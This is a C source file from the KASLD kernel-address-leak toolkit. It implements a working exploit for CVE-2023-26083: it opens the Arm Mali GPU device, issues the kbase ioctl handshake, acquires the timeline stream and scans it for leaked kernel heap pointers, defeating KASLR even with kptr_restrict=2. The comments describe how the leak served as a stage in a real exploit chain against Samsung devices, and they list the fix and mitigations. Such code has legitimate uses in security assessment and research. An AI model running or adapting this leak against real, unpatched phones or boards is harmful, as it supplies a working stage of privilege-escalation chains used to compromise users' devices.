// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Recover kernel virtual addresses from the Arm Mali GPU driver timeline stream
// (CVE-2023-26083).
//
// The Mali "kbase" kernel driver (drivers/gpu/arm/..., on the great majority of
// Android phones, Chromebooks and ARM SoC boards) exposes a profiling
// "timeline" stream. Any process that can open the GPU device node can acquire
// it. On affected versions the timeline tracepoint serialiser writes RAW kernel
// object pointers straight into the stream as event identifiers, e.g.:
//
//   void __kbase_tlstream_tl_new_ctx(void *context, u32 nr, u32 tgid) {
//       ... write_bytes(buffer, pos, &context, sizeof(context)); ...
//   }
//
// tl_new_ctx / tl_summary_new_ctx (kbase_context*), tl_new_atom
// (kbase_jd_atom*), tl_ret_as_ctx (kbase_as*, ctx*), tl_ret_ctx_lpu (ctx*,
// lpu*) all emit live kernel heap (slab / direct-map) pointers. On
// TLSTREAM_ACQUIRE the driver emits a SUMMARY of existing objects immediately,
// so a single read of the returned fd yields kernel pointers without any GPU
// work.
//
//   open /dev/mali0
//     -> KBASE_IOCTL_VERSION_CHECK   (mandatory handshake)
//     -> KBASE_IOCTL_SET_FLAGS       (create the kernel context)
//     -> KBASE_IOCTL_TLSTREAM_ACQUIRE (returns the timeline stream fd)
//   read(fd) -> message buffer; scan it for values inside a kernel VAS window.
//
// Coverage: this targets the LEGACY timeline tracepoint family (tl_new_ctx and
// friends) that serialise raw pointers — Midgard, Bifrost and Valhall-JM
// (Mali-G57/G77/G78), i.e. most Mali devices up to ~2022. The newer KBase
// tracepoint family (tl_kbase_new_ctx, used by Valhall-CSF / Mali-G710+) and
// post-fix drivers identify objects by u32 id, not pointer, so they yield no
// kernel-VAS value and this component reports nothing — which is also the
// runtime signal that a target is patched/CSF. Being scan-based, the component
// needs no per-version knowledge: it emits whatever kernel pointers the stream
// actually carries.
//
// Deferred improvement: a per-version packet parser. The scan cannot type a
// value, so it relies on heuristics — a kernel floor, an alignment gate, and a
// 2 MiB-aligned reject to drop GPU virtual addresses the stream also serialises
// (a GPUVA bump-allocates through the kernel VAS range and is not a kernel
// pointer). Decoding the timeline packet framing (the legacy pre-MIPE protocol
// here, or MIPE on Bifrost/Valhall) to extract only pointer-typed tracepoint
// args would remove those heuristics and correctly ignore GPUVAs, at the cost
// of per-version framing code — the trade the scan deliberately avoids.
//
// Because the disclosure is raw bytes copied into the stream (not a %pK print),
// it is unaffected by kernel.kptr_restrict and survives kptr_restrict=2 — only
// the GPU device-node permission gates it (commonly group "gpu"/"graphics",
// i.e. any app). This was the KASLR-defeat stage of a real in-the-wild exploit
// chain against Samsung devices that Google's Threat Analysis Group (TAG)
// discovered and reported to Arm (2023). Fixed in r43p0+ by replacing the
// pointers with obfuscated object ids — on a patched driver the stream carries
// no kernel-VAS value and this component reports nothing.
//
// Leak primitive:
//   Data leaked:      kernel virtual addresses (kbase_context / atom / as /
//   lpu;
//                     direct-map or vmalloc, depending on the allocation)
//   Kernel subsystem: Arm Mali "kbase" GPU driver timeline
//   (mali_kbase_tlstream) Data structure:   timeline stream message buffer
//   Address type:     virtual (direct-map / vmalloc)
//   Method:           parsed (ioctl + stream read)
//   Status:           CVE-2023-26083 (fixed r43p0+; older drivers unfixed)
//   Credit:           discovered in-the-wild and reported to Arm by Google's
//                     Threat Analysis Group (TAG), part of a 2023 exploit chain
//                     against Samsung devices
//   Access check:     GPU device-node permission only — NOT kptr_restrict
//
// Mitigations:
//   Update to Mali r43p0+ (obfuscated timeline object ids). Tightening the GPU
//   device-node permission removes the access. No runtime sysctl affects it.
// ---
// <bcoles@gmail.com>

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Acquires the Arm Mali GPU driver timeline stream (CVE-2023-26083) and "
    "scans it for kernel virtual addresses. On unfixed Mali versions the "
    "timeline serialises raw kernel object pointers (kbase_context, atom, "
    "address-space) as event identifiers; the summary emitted on acquire "
    "yields them with a single read. The disclosure is raw bytes, not a %pK "
    "print, so it is unaffected by kptr_restrict and survives kptr_restrict=2. "
    "Fixed in r43p0+ (obfuscated object ids); patched drivers yield nothing. "
    "The only gate is GPU device-node permission (commonly the gpu/graphics "
    "group, i.e. any app).");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "live:1\n"
           "addr:virtual\n"
           "cve:CVE-2023-26083\n"
           "config:CONFIG_MALI_MIDGARD\n"
           "note:bypasses_kptr_restrict\n");

/* Mali kbase UABI (uapi/.../mali_kbase_ioctl.h): type 0x80; numbers stable
 * across the modern ABI (r21p0..). The acquire ioctl's return value is the
 * timeline stream fd. */
#define KBASE_IOCTL_TYPE 0x80
struct kbase_ioctl_version_check {
  uint16_t major;
  uint16_t minor;
};
struct kbase_ioctl_set_flags {
  uint32_t create_flags;
};
struct kbase_ioctl_tlstream_acquire {
  uint32_t flags;
};
#define KBASE_IOCTL_VERSION_CHECK                                              \
  _IOWR(KBASE_IOCTL_TYPE, 0, struct kbase_ioctl_version_check)
#define KBASE_IOCTL_SET_FLAGS                                                  \
  _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)
#define KBASE_IOCTL_TLSTREAM_ACQUIRE                                           \
  _IOW(KBASE_IOCTL_TYPE, 18, struct kbase_ioctl_tlstream_acquire)
#define KBASE_IOCTL_TLSTREAM_FLUSH _IO(KBASE_IOCTL_TYPE, 19)

/* Enable timeline tracepoints (bit 0); leave job-dumping (bit 1) off. */
#define BASE_TLSTREAM_ENABLE_LATENCY_TRACEPOINTS (1u << 0)

/* The _IOWR/_IOW request numbers carry direction bits (0xc0000000 /
 * 0x40000000), so they exceed INT_MAX; musl's ioctl() takes an int request and
 * would warn on the implicit narrowing (-Woverflow). The bit pattern is what
 * the kernel compares, and it is preserved, so cast explicitly through this
 * wrapper. */
static int mali_ioctl(int fd, unsigned long req, void *arg) {
  return ioctl(fd, (int)req, arg);
}

static const char *const mali_nodes[] = {"/dev/mali0", "/dev/mali", NULL};

/* All three noise filters below are format-independent (they test the VALUE,
 * not the packet framing), so they hold across every kbase timeline protocol
 * version — legacy and MIPE alike — without decoding it. */

/* Slab-alignment gate. The leaked object pointers (kbase_context / atom /
 * address-space) are cache-line-aligned allocations (ARM's
 * ARCH_KMALLOC_MINALIGN is a cache line). Requiring this alignment drops
 * in-range non-pointer fields (timestamps, sizes, GPU virtual addresses) that
 * are not so aligned. It can only cost completeness (a finer-aligned real
 * pointer), never soundness. */
#define MALI_PTR_ALIGN 64

/* Candidate table: each distinct in-window value with the number of times it
 * appears in the stream (feeds the repeated-value filter in main). */
#define HITS_MAX 512
static struct {
  unsigned long v;
  int count;
} g_hits[HITS_MAX];
static int g_nhits;

static void record_hit(unsigned long v) {
  for (int i = 0; i < g_nhits; i++)
    if (g_hits[i].v == v) {
      g_hits[i].count++;
      return;
    }
  if (g_nhits < HITS_MAX) {
    g_hits[g_nhits].v = v;
    g_hits[g_nhits].count = 1;
    g_nhits++;
  }
}

/* Region tag by arch band. A leaked timeline pointer is a kernel heap
 * object — a linear-map (direct-map / lowmem) allocation or a vmalloc one,
 * never kernel text or a module. Split at KERNEL_VIRT_TEXT_MAX: below it is
 * confidently within the linear-map/text band, above it is vmalloc/vmemmap. The
 * exact lowmem/vmalloc boundary (high_memory) is a runtime value this
 * standalone probe cannot know, so the split is approximate — but the tag is
 * cosmetic for soundness: both bands are >= PAGE_OFFSET, so the PAGE_OFFSET
 * bound the sample carries holds either way. Tagging the ambiguous high band
 * vmalloc (rather than over-claiming direct map) is the conservative choice. */
static int emit_addr(unsigned long addr, int count) {
  enum kasld_region region = (addr < (unsigned long)KERNEL_VIRT_TEXT_MAX)
                                 ? REGION_DIRECTMAP
                                 : REGION_VMALLOC;
  kasld_info("mali timeline leaked kernel pointer: 0x%lx (%s, seen x%d)", addr,
             kasld_region_wire(region), count);
  kasld_result_sample(KASLD_TYPE_VIRT, region, addr, NULL, CONF_PARSED);
  return 1;
}

/* v < floor, with the floor passed as a runtime argument so the comparison is
 * not folded to `v < 0` on arches whose PAGE_OFFSET macro is 0 (s390, where the
 * linear-map base is the runtime __identity_base) — which -Wtype-limits flags
 * as always-false. A 0 floor (those arches have no Mali anyway) disables the
 * test. */
static int mali_below_floor(unsigned long v, unsigned long floor) {
  return floor != 0 && v < floor;
}

/* Scan the binary stream for pointer-width values inside a kernel window. Every
 * timeline field is a multiple of 4 bytes (u32 msg id, u64 timestamp, then the
 * pointer), so pointers sit at 4-byte-aligned offsets. Stepping by 4 (not 1)
 * catches them while avoiding byte-shifted aliases — on arches whose kernel
 * pointers share high bytes (arm64: 0xffff…), a 1-byte-shifted read of a real
 * pointer can itself fall in-window. Records candidates (with counts) rather
 * than emitting, so the whole stream is seen before the count filter decides.
 */
static int scan_buf(const unsigned char *buf, size_t len) {
  int seen = 0;
  if (len < sizeof(unsigned long))
    return 0;
  for (size_t off = 0; off + sizeof(unsigned long) <= len;
       off += sizeof(uint32_t)) {
    unsigned long v;
    memcpy(&v, buf + off, sizeof(v));
    if (v == 0 || v == ~0UL)
      continue;
    /* Sound kernel floor: a direct-map slab pointer is >= PAGE_OFFSET. On
     * 32-bit PAGE_OFFSET is the highest VMSPLIT boundary (0xc0000000), so this
     * drops the stream's ASCII tracepoint-descriptor header (byte values <=
     * 0x7e) and any userspace pointer it carries; on 64-bit the kernel/user
     * split makes it unambiguous. */
    if (mali_below_floor(v, (unsigned long)PAGE_OFFSET))
      continue;
    if (v & (MALI_PTR_ALIGN - 1))
      continue;
    /* Drop exactly-2 MiB-aligned values. On this driver those are GPU memory
     * allocations whose serialised address is a GPU VIRTUAL address that
     * bump-allocates through — and past — the kernel VAS range: a false
     * positive, not a kernel pointer (shown on hardware: it climbs
     * monotonically per run and spans both lowmem and vmalloc, which no single
     * kernel object does). Genuine kbase struct pointers are cache-line- but
     * not huge-page-aligned. This also drops a real 2 MiB huge-page kernel VA,
     * but those are indistinguishable from a GPUVA and rare. */
    if ((v & (0x200000ul - 1)) == 0)
      continue;
    record_hit(v);
    seen++;
  }
  return seen;
}

int main(int argc, char **argv) {
  kasld_cli(argc, argv);
  /* Live host probe: opens the running kernel's Mali GPU device and reads its
   * timeline stream; the leaked pointers are this machine's, not reproducible
   * from a captured tree. */
  if (kasld_skip_live_probe("mali_timeline"))
    return 0;

  int fd = -1;
  for (int i = 0; mali_nodes[i]; i++) {
    fd = open(mali_nodes[i], O_RDWR | O_CLOEXEC);
    if (fd >= 0) {
      kasld_info("opened Mali GPU device %s", mali_nodes[i]);
      break;
    }
    if (errno == EACCES || errno == EPERM) {
      kasld_err("%s present but not permitted (GPU group?)", mali_nodes[i]);
      return KASLD_EXIT_NOPERM;
    }
  }
  if (fd < 0)
    return KASLD_EXIT_UNAVAILABLE; /* no Mali GPU */

  /* Mandatory handshake, then create the context. VERSION_CHECK is in/out: it
   * writes the kernel's own version back into the struct. Some kbase versions
   * reject a mismatched major (leaving SET_FLAGS to fail), so probe once to
   * learn the kernel version, then re-handshake with it so the major matches.
   */
  struct kbase_ioctl_version_check vc = {.major = 11, .minor = 0};
  if (mali_ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &vc) != 0) {
    kasld_err("KBASE_IOCTL_VERSION_CHECK failed (not Mali / incompatible ABI)");
    close(fd);
    return KASLD_EXIT_UNAVAILABLE;
  }
  kasld_info("Mali kbase UK ABI version %u.%u", vc.major, vc.minor);
  /* re-handshake with the kernel's reported version (harmless if already
   * matched) */
  (void)mali_ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &vc);

  struct kbase_ioctl_set_flags sf = {.create_flags = 0};
  if (mali_ioctl(fd, KBASE_IOCTL_SET_FLAGS, &sf) != 0) {
    kasld_err("KBASE_IOCTL_SET_FLAGS failed");
    close(fd);
    return KASLD_EXIT_UNAVAILABLE;
  }

  struct kbase_ioctl_tlstream_acquire acq = {
      .flags = BASE_TLSTREAM_ENABLE_LATENCY_TRACEPOINTS};
  int tl = mali_ioctl(fd, KBASE_IOCTL_TLSTREAM_ACQUIRE, &acq);
  if (tl < 0) {
    kasld_err("KBASE_IOCTL_TLSTREAM_ACQUIRE failed (patched or in use)");
    close(fd);
    return KASLD_EXIT_UNAVAILABLE;
  }
  kasld_info("acquired Mali timeline stream; reading object summary");

  (void)mali_ioctl(fd, KBASE_IOCTL_TLSTREAM_FLUSH,
                   NULL); /* push pending summary out */
  (void)fcntl(tl, F_SETFL, fcntl(tl, F_GETFL, 0) | O_NONBLOCK);

  /* Drain the summary, then briefly capture live tracepoints. The summary holds
   * only the GPU objects that exist at acquire time, so on an otherwise-idle
   * GPU it can be a single object; it can also trickle out across several
   * packets. Keep polling THROUGH short idle gaps rather than stopping at the
   * first one, so the whole summary plus any live events from other GPU clients
   * (a running compositor emits new contexts/atoms as it renders) are collected
   * — this is what turns the frequent single-sample run into a fuller set. Give
   * up only after the stream stays continuously quiet, or the read cap is hit.
   * Older drivers ignore O_NONBLOCK and block in .read(), so poll() gates every
   * read.
   *
   * Termination is bounded: at most `max_idle` consecutive quiet polls (the
   * quiet-window budget) before giving up, plus a read cap for the busy-GPU
   * case. The window defaults to ~3s — wide enough to catch the next render on
   * a mostly-static desktop, where genuine objects only appear when something
   * draws — and is overridable with the standard -t/--time SECS flag (clamped
   * to 600 s so a stray value cannot wedge the loop). */
  enum { POLL_MS = 250, DEFAULT_WINDOW_MS = 3000 };
  int window_ms = DEFAULT_WINDOW_MS;
  if (kasld_time_s > 0)
    window_ms = (kasld_time_s > 600) ? 600000 : (int)(kasld_time_s * 1000);
  int max_idle = window_ms / POLL_MS;
  if (max_idle < 1)
    max_idle = 1;
  int max_reads = max_idle + 64; /* headroom for a busy GPU (data every poll) */
  unsigned char buf[8192];
  int idle = 0;
  for (int reads = 0; reads < max_reads && idle < max_idle; reads++) {
    struct pollfd pfd = {.fd = tl, .events = POLLIN};
    int pr = poll(&pfd, 1, POLL_MS);
    if (pr < 0)
      break; /* poll error */
    if (pr == 0) {
      idle++;
      continue; /* quiet tick: keep waiting for sporadic live events */
    }
    idle = 0;
    ssize_t n = read(tl, buf, sizeof(buf));
    if (n > 0) {
      (void)scan_buf(buf, (size_t)n);
      continue;
    }
    if (n < 0 && errno == EAGAIN)
      continue; /* poll raced; try again */
    break;      /* EOF or hard error */
  }

  /* Repeated-value filter. A genuine timeline object pointer is referenced by
   * several tracepoints (a context by its new_ctx plus every atom that runs in
   * it; an atom by new_atom plus its state changes), so it recurs in the
   * stream; a one-off coincidental in-window value does not. This is a property
   * of the tracepoint model, independent of the packet format, so it holds on
   * every kbase version without a parser. Emit only values seen >= min_count.
   * Default 1 (emit every candidate); set MALI_MIN_COUNT higher to keep only
   * recurring values. NOTE: the object summary lists each object ONCE, so
   * counts >= 2 require live GPU activity (captured by the read window above) —
   * on a purely idle summary every count is 1 and a threshold of 2 emits
   * nothing. */
  int min_count = 1;
  const char *mc = getenv("MALI_MIN_COUNT");
  if (mc && atoi(mc) > 0)
    min_count = atoi(mc);

  int repeated = 0;
  for (int i = 0; i < g_nhits; i++)
    if (g_hits[i].count >= 2)
      repeated++;
  kasld_info("timeline candidates: %d unique (%d seen >=2x); min_count=%d",
             g_nhits, repeated, min_count);

  int total = 0;
  for (int i = 0; i < g_nhits; i++)
    if (g_hits[i].count >= min_count)
      total += emit_addr(g_hits[i].v, g_hits[i].count);

  if (!total)
    kasld_info(
        "no kernel-VAS pointers in timeline (patched / r43p0+, or empty)");

  close(tl);
  close(fd);
  return 0;
}
